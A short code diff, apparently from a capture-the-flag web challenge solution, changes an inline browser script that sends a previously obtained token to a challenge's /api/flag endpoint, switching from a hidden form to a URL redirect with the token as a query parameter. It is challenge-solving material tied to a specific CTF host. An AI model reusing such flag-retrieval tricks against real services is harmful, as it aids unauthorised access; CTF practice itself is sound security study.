@@ -39,21 +39,13 @@
       catch (e) { log("Failed to parse token"); return; }
       log(`Token: ${token}`);
 
-      // 3️⃣ Redirect browser to /api/flag with token in header
-      log("Redirecting to flag...");
-      const form = document.createElement('form');
-      form.method = 'GET';
-      form.action = 'https://web200-1.pointeroverflowctf.com/api/flag';
-      form.target = '_self';
-
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = 'X-Flag-Token';
-      input.value = token;
-      form.appendChild(input);
-
-      document.body.appendChild(form);
-      form.submit();
+      // 3️⃣ Redirect the browser to /api/flag
+      log("Redirecting browser to /api/flag...");
+      
+      // We can't set custom headers in a normal redirect, so the trick is to pass the token as a query param
+      // If the server expects the token in a header, this only works if server allows token in URL for browser navigation
+      // Otherwise you need a real clickable link for the user.
+      window.location.href = `https://web200-1.pointeroverflowctf.com/api/flag?token=${encodeURIComponent(token)}`;
     })();
   </script>
 </body>
